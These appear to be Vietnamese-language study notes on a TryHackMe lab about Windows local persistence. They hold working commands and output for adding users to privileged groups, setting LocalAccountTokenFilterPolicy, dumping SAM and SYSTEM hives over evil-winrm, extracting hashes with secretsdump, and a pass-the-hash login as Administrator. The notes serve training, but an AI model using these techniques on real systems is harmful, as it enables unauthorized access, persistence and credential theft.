---
template: overrides/blog.html
icon: material/plus-circle
title: Windows Local Persistence
description: >
  
search:
  exclude: true
hide:
  - feedback


tags:
  - THM-Room 
  - Red Teaming - Post Compromise
---

# __Windows Local Persistence__

---

## __Task 1: Introduction__

Sau khi có những bước đầu thâm nhập hệ thống cục bộ, bạn phải ghi nhớ:

- Re-exploitation isn't always possible
- Gaining a foothold is hard to reproduce
- The blue team is after you

## __Task 2: Tampering With Unprivileged Accounts__

### __Assign Group Memberships__

Cách trực tiếp để biến 1 người dùng bình thường không có đặc quyền có được quyền Admin là biến người dùng đó thành một phần của nhóm Admin. Dùng lệnh

```ps1
net localgroup administrators thmuser0 /add
```

```ps1
C:\> net localgroup "Backup Operators" thmuser1 /add
```

```ps1
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

```ps1
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

```ps1 title="AttackBox"
user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
        
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

```ps1 title="AttackBox"
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

```ps1 title="AttackBox"
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
[*] Cleaning up...
```

```ps1 title="AttackBox"
user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

### __Special Privileges and Security Descriptors__